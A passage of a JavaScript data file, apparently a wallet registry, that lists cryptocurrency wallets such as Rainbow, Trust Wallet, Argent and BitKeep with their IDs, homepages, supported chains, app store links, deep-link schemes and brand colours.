        id: "133775474",
        name: "Polkadot Wallet"
    },
    "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63": {
        id: "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63",
        name: "D'CENT Wallet",
        homepage: "https://dcentwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/kr/app/dcent-hardware-wallet/id1447206611",
            android: "https://play.google.com/store/apps/details?id=com.kr.iotrust.dcent.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "D'CENT",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369": {
        id: "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
        name: "Rainbow",
        homepage: "https://rainbow.me/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "rainbow:",
            universal: "https://rnbwapp.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Rainbow",
            colors: {
                primary: "rgb(0, 30, 89)",
                secondary: ""
            }
        }
    },
    "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0": {
        id: "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
        name: "Trust Wallet",
        homepage: "https://trustwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1288339409",
            android: "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "trust:",
            universal: "https://link.trustwallet.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Trust",
            colors: {
                primary: "rgb(51, 117, 187)",
                secondary: ""
            }
        }
    },
    cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46: {
        id: "cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46",
        name: "Argent",
        homepage: "https://argent.xyz/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/argent/id1358741926",
            android: "https://play.google.com/store/apps/details?id=im.argent.contractwalletclient",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "argent://app",
            universal: "https://argent.link/app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Argent",
            colors: {
                primary: "rgb(255, 135, 91)",
                secondary: ""
            }
        }
    },
    a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f: {
        id: "a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f",
        name: "Gnosis Safe Multisig",
        homepage: "https://gnosis-safe.io/",
        chains: ["eip155:1"],
        app: {
            browser: "https://gnosis-safe.io/app/",
            ios: "https://apps.apple.com/app/id1515759131",
            android: "https://play.google.com/store/apps/details?id=io.gnosis.safe",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Gnosis Safe",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "1ce6dae0fea7114841": {
        id: "1ce6dae0fea7114841",
        name: "Equal",
        homepage: "https://equal.tech/",
        chains: ["eip155:1"]
    },
    "1ce6dae0fea7114842": {
        id: "1ce6dae0fea7114842",
        name: "MEET.ONE",
        homepage: "https://www.meet.one/",
        chains: ["eip155:1"]
    },
    "1ce6dae0fea7114843": {
        id: "1ce6dae0fea7114843",
        name: "MoriX Wallet",
        homepage: "https://morixjp.com/eng/products/walletcard",
        chains: ["eip155:1"]
    },
    f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d: {
        id: "f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d",
        name: "Crypto.com | DeFi Wallet",
        homepage: "https://crypto.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1262148500",
            android: "https://play.google.com/store/apps/details?id=co.mona.android",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "cryptowallet:",
            universal: "https://wallet.crypto.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Crypto.com",
            colors: {
                primary: "rgb(17, 153, 250)",
                secondary: ""
            }
        }
    },
    "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c": {
        id: "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c",
        name: "Pillar",
        homepage: "https://pillarproject.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1346582238",
            android: "https://play.google.com/store/apps/details?id=com.pillarproject.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "pillarwallet:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Pillar",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2": {
        id: "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2",
        name: "imToken",
        homepage: "https://token.im/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/imtoken2/id1384798940",
            android: "https://play.google.com/store/apps/details?id=im.token.app",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "imtokenv2:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "imToken",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137: {
        id: "dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137",
        name: "ONTO",
        homepage: "https://onto.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/onto-an-ontology-dapp/id1436009823",
            android: "https://play.google.com/store/apps/details?id=com.github.ontio.onto",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "ontoprovider:",
            universal: "https://onto.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "ONTO",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66": {
        id: "20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66",
        name: "TokenPocket",
        homepage: "https://tokenpocket.pro/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/tokenpocket-trusted-wallet/id1436028697",
            android: "https://play.google.com/store/apps/details?id=vip.mytokenpocket",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "tpoutside:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "TokenPocket",
            colors: {
                primary: "rgb(41, 128, 254)",
                secondary: ""
            }
        }
    },
    "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26": {
        id: "7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26",
        name: "MathWallet",
        homepage: "https://mathwallet.org/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/math-wallet-blockchain-wallet/id1383637331",
            android: "https://play.google.com/store/apps/details?id=com.medishares.android",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "mathwallet:",
            universal: "https://www.mathwallet.org"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "MathWallet",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b: {
        id: "ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b",
        name: "BitPay",
        homepage: "https://bitpay.com",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/bitpay-buy-crypto/id1149581638",
            android: "https://play.google.com/store/apps/details?id=com.bitpay.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "bitpay:",
            universal: "https://bitpay.com/wallet"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "BitPay",
            colors: {
                primary: "rgb(26, 59, 139)",
                secondary: ""
            }
        }
    },
    "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168": {
        id: "83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168",
        name: "Walleth",
        homepage: "https://walleth.org/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=org.walleth",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Walleth",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d": {
        id: "71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d",
        name: "Authereum",
        homepage: "https://authereum.org",
        chains: ["eip155:1"],
        app: {
            browser: "https://authereum.com/i/account",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Authereum",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f": {
        id: "9dab7bd72148e2f796452630230666daf507935fae7bb9baf22b3c11960b034f",
        name: "Dharma",
        homepage: "https://www.dharma.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/dharma-save-send-globally/id1495144415",
            android: "https://play.google.com/store/apps/details?id=io.dharma.Dharma",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "dharma:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Dharma",
            colors: {
                primary: "#0DD675",
                secondary: "#F5F5F5"
            }
        }
    },
    "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890": {
        id: "09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890",
        name: "1inch Wallet",
        homepage: "https://1inch.io/wallet/",
        chains: ["eip155:1", "eip155:56"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/1inch-defi-wallet/id1546049391",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "1inch:",
            universal: "https://wallet.1inch.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "1inch",
            colors: {
                primary: "rgb(31, 36, 46)",
                secondary: ""
            }
        }
    },
    bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4: {
        id: "bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4",
        name: "Huobi Wallet",
        homepage: "https://huobiwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1433883012",
            android: "https://play.google.com/store/apps/details?id=com.huobionchainwallet.gp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "huobiwallet:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Huobi",
            colors: {
                primary: "rgb(45,101,248)",
                secondary: ""
            }
        }
    },
    efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61: {
        id: "efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61",
        name: "Eidoo",
        homepage: "https://eidoo.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/apple-store/id1279896253",
            android: "https://play.google.com/store/apps/details?id=io.eidoo.wallet.prodnet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "eidoo:",
            universal: "https://eidoo.io/crypto-wallet"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Eidoo",
            colors: {
                primary: "rgb(55, 179, 159)",
                secondary: ""
            }
        }
    },
    "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e": {
        id: "61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e",
        name: "MYKEY",
        homepage: "https://mykey.org",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/id1458318224",
            android: "https://play.google.com/store/apps/details?id=com.mykey.id",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "mykeywalletconnect:",
            universal: "https://mykey.org"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "MYKEY",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756: {
        id: "dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756",
        name: "Loopring Wallet",
        homepage: "https://loopring.io",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/loopring-smart-wallet/id1550921126",
            android: "https://play.google.com/store/apps/details?id=loopring.defi.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Loopring",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6": {
        id: "6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6",
        name: "TrustVault",
        homepage: "https://trustology.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1455959680",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "TrustVault",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a": {
        id: "185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a",
        name: "Atomic",
        homepage: "https://atomicwallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/atomic-wallet/id1478257827",
            android: "https://play.google.com/store/apps/details?id=io.atomicwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Atomic",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e: {
        id: "b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e",
        name: "Coin98",
        homepage: "https://coin98.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://ios.coin98.app/",
            android: "https://play.google.com/store/apps/details?id=coin98.crypto.finance.media",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "coin98:",
            universal: "https://coin98.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Coin98",
            colors: {
                primary: "rgb(39,39,39)",
                secondary: ""
            }
        }
    },
    "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d": {
        id: "1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d",
        name: "CoolWallet S",
        homepage: "https://coolwallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/coolwallet-s-2018/id1328764142",
            android: "https://play.google.com/store/apps/details?id=com.coolbitx.cwsapp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "CoolWallet S",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693: {
        id: "beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693",
        name: "Alice",
        homepage: "https://alicedapp.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/au/app/alice-browser/id1472818028",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Alice",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98": {
        id: "138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98",
        name: "AlphaWallet",
        homepage: "https://alphawallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/alphawallet-eth-wallet/id1358230430",
            android: "https://play.google.com/store/apps/details?id=io.stormbird.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: "https://aw.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "AlphaWallet",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09": {
        id: "29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09",
        name: "ZelCore",
        homepage: "https://zel.network",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/zelcore/id1436296839",
            android: "https://play.google.com/store/apps/details?id=com.zelcash.zelcore",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "zel:",
            universal: "https://link.zel.network"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "ZelCore",
            colors: {
                primary: "rgb(35, 34, 32)",
                secondary: ""
            }
        }
    },
    "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14": {
        id: "8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14",
        name: "Nash",
        homepage: "https://nash.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/nash-app/id1475759236",
            android: "https://play.google.com/store/apps/details?id=io.nash.app",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "nash:",
            universal: "https://nash.io/walletconnect"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Nash",
            colors: {
                primary: "rgb(0,82,243)",
                secondary: ""
            }
        }
    },
    "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814": {
        id: "9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814",
        name: "Coinomi",
        homepage: "https://coinomi.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/coinomi-wallet/id1333588809",
            android: "https://play.google.com/store/apps/details?id=com.coinomi.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Coinomi",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702": {
        id: "6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702",
        name: "GridPlus",
        homepage: "https://gridplus.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "GridPlus",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5: {
        id: "a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5",
        name: "CYBAVO Wallet",
        homepage: "https://cybavo.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/tw/app/cybavo-wallet/id1510697681",
            android: "https://play.google.com/store/apps/details?id=com.cybavo.btc.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "cybavowallet:",
            universal: "https://cdn.cybavo.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "CYBAVO",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0: {
        id: "c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0",
        name: "Tokenary",
        homepage: "https://tokenary.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/tokenary-ethereum-wallet/id1372886601",
            android: "https://play.google.com/store/apps/details?id=com.jufy.tokenary",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Tokenary",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50": {
        id: "3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50",
        name: "Torus",
        homepage: "https://toruswallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "https://app.tor.us/",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Torus",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09": {
        id: "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09",
        name: "Spatium",
        homepage: "https://spatium.net/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/spatium/id1404844195",
            android: "https://play.google.com/store/apps/details?id=capital.spatium.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Spatium",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6: {
        id: "d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6",
        name: "Infinito",
        homepage: "https://infinitowallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/infinito-wallet/id1315572736",
            android: "https://play.google.com/store/apps/details?id=io.infinito.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Infinito",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b": {
        id: "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b",
        name: "wallet.io",
        homepage: "https://wallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/vn/app/wallet-io/id1459857368",
            android: "https://play.google.com/store/apps/details?id=io.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "wallet.io",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f": {
        id: "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f",
        name: "Infinity Wallet",
        homepage: "https://infinitywallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "",
            mac: "https://infinitywallet.io/desktop",
            windows: "https://infinitywallet.io/desktop",
            linux: "https://infinitywallet.io/desktop"
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Infinity",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad": {
        id: "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad",
        name: "Ownbit",
        homepage: "https://ownbit.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/es/app/ownbit-btc-eth-cold-wallet/id1321798216",
            android: "https://play.google.com/store/apps/details?id=com.bitbill.www",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Ownbit",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c": {
        id: "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c",
        name: "EasyPocket",
        homepage: "https://easypocket.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1517338927",
            android: "https://easypocket.app/",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "easypocket:",
            universal: "https://wallet.easypocket.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "EasyPocket",
            colors: {
                primary: "rgb(17, 93, 251)",
                secondary: ""
            }
        }
    },
    "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb": {
        id: "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb",
        name: "Bridge Wallet",
        homepage: "https://mtpelerin.com/bridge-wallet",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/bridge-wallet/id1481859680",
            android: "https://play.google.com/store/apps/details?id=com.mtpelerin.bridge",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Bridge",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1": {
        id: "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1",
        name: "SparkPoint",
        homepage: "https://sparkpoint.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=com.sparkpoint",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "sparkpoint:",
            universal: "https://sparkpoint.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "SparkPoint",
            colors: {
                primary: "rgb(20,67,95)",
                secondary: ""
            }
        }
    },
    ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1: {
        id: "ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1",
        name: "ViaWallet",
        homepage: "https://viawallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/viawallet/id1462031389",
            android: "https://play.google.com/store/apps/details?id=com.viabtc.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "ViaWallet",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106": {
        id: "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106",
        name: "BitKeep",
        homepage: "https://bitkeep.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/bitkeep/id1395301115",
            android: "https://play.google.com/store/apps/details?id=com.bitkeep.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "bitkeep:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "BitKeep",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c: {
